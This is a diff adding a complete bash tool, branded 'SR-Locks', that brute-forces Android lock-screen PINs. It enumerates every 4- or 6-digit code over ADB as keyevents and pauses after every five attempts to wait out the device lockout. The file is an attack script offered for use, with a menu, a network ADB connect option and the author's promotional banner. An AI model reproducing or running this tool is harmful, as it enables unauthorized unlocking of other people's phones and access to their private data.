@@ -1,0 +1,172 @@
+#!/usr/bin/env bash
+
+RED=$(tput setaf 1)
+GREEN=$(tput setaf 2)
+YELLOW=$(tput setaf 3)
+BLUE=$(tput setaf 6)
+col=$(tput cols)
+NC=$(tput sgr 0)
+clear
+
+function print_centered {
+     [[ $# == 0 ]] && return 1
+
+     declare -i TERM_COLS="$(tput cols)"
+     declare -i str_len="${#1}"
+     [[ $str_len -ge $TERM_COLS ]] && {
+          echo "$1";
+          return 0;
+     }
+
+     declare -i filler_len="$(( (TERM_COLS - str_len) / 2 ))"
+     [[ $# -ge 2 ]] && ch="${2:0:1}" || ch=" "
+     filler=""
+     for (( i = 0; i < filler_len; i++ )); do
+          filler="${filler}${ch}"
+     done
+
+     printf "%s%s%s" "$filler" "$1" "$filler"
+     [[ $(( (TERM_COLS - str_len) % 2 )) -ne 0 ]] && printf "%s" "${ch}"
+     printf "\n"
+
+     return 0
+}
+
+function 4digit()
+{
+adb shell input keyevent 26 # power
+adb shell input keyevent 82 # menu
+#adb shell input swipe 407 1211 378 85
+#adb shell input keyevent 66 # enter
+sleep 3
+for i in {0000..9999}; do
+
+    echo "$BLUE [+]$GREEN Sending $i"
+
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+
+    adb shell input keyevent 66 # enter
+
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66 # enter
+        echo "$BLUE [*]$YELLOW 5 pin sended"
+        adb shell input keyevent 4 # back
+        adb shell input keyevent 4 # back
+        sleep 30
+        adb shell input keyevent 26 # power
+        adb shell input keyevent 82 # menu
+        #adb shell input swipe 407 1211 378 85
+        #adb shell input keyevent 66 # enter
+        sleep 3
+    fi
+done
+}
+
+function 6digit()
+{
+adb shell input keyevent 26 # power
+adb shell input keyevent 82 # menu
+#adb shell input swipe 407 1211 378 85
+#adb shell input keyevent 66 # enter
+sleep 3
+for i in {000000..999999}; do
+    echo "Try =>" $i
+
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+
+    adb shell input keyevent 66 # enter
+
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66 # enter
+        echo "$BLUE [*]$YELLOW 5 pin sended"
+        adb shell input keyevent 4 # back
+        adb shell input keyevent 4 # back
+        secs=$((1 * 30))
+        while [ $secs -gt 0 ]; do
+            echo -ne "$secs\033[0K\r"
+            sleep 1
+            : $((secs--))
+        done
+        sleep 30
+        adb shell input keyevent 26 # power
+        adb shell input keyevent 82 # menu
+        #adb shell input swipe 407 1211 378 85
+        #adb shell input keyevent 66 # enter
+        sleep 3
+    fi
+done
+}
+
+function adb_connect()
+{
+    read -p "host: " ipaddrs;
+    adb connect $ipaddrs
+    return 0
+}
+
+printf '%s%*s%s' "$RED" $col "<|=========================|"
+printf "$RED|=========================================|>\n$GREEN"
+figlet -tc SR-Locks -f slant
+printf '%s%*s%s' "$RED" $col "<|=========================================|"
+printf "$RED|=========================|>\n\n$NC"
+
+print_centered "-=[ Author: Arie-SR91 ]=-"
+print_centered "-=[ Github: https://github.com/ArieSR91 ]=-"
+print_centered "-=[ Tiktok: https://tiktok.com/@arie_sr91 ]=-"
+print_centered "-=[ Youtube: https://youtube.com/@arie_sr91 ]=-"
+
+function start_srlocks()
+{
+    echo -e "------------------------------$GREEN\n"
+    adb devices
+    echo "$NC------------------------------"
+    echo -e "$YELLOW [1]$BLUE Android pin 4 digit\n$YELLOW [2]$BLUE Android pin 6 digit\n$YELLOW [3]$BLUE Connect adb\n$YELLOW [4]$BLUE Exit$NC"
+    echo -e "------------------------------\m"
+    read -p "Arie-SR91@srlocks:$PWD \$ " pilih;
+    if [ "$pilih" == "1" ] || [ "$pilih" == "" ]; then
+        echo -e "\n<---------------->"
+        4digit
+    fi
+    if [ "$pilih" == "2" ]; then
+        echo -e "\n<---------------->"
+        6digit
+    fi
+    if [ "$pilih" == "3" ]; then
+        adb_connect
+        srlocks crack
+    fi
+    if [ "$pilih" == "4" ]; then
+        exit
+    else
+        exit
+    fi
+}
+
+function show_help()
+{
+echo -e "\nUsage: srlocks [options]
+
+Options: crack    : brute force android pin
+         connect  : connect adb to device
+"
+}
+case $1 in
+    --help|-h|help)
+        show_help
+        ;;
+    --version|-v)
+        echo "1.1.0-SR"
+        ;;
+    crack)
+        start_srlocks
+        ;;
+    connect)
+        adb_connect
+        ;;
+    *)
+        echo -e "\nType: srlocks --help to show help screen.\n"
+esac
